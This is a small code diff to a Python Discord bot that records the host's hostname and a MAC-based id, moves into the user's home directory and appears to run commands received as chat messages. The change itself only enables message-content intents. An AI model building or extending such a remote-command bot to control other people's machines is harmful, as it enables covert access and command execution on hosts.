@@ -6,6 +6,12 @@ import discord
 
 import uuid #used for checking unique hosts 
 
+
+# Discord Intents, which is something you have to do now apparently 
+intents = discord.Intents.default()
+intents.message_content = True
+
+
 id = (hex(uuid.getnode()))
 hostname = subprocess.check_output("hostname", shell=True, text=True)
 print(hostname)
@@ -19,7 +25,7 @@ f.close()
 # Set default dir as users home 
 os.chdir(os.path.expanduser('~')) 
 
-client = discord.Client()
+client = discord.Client(intents=intents)
 
 async def runCommand(message, command):
     print(command)
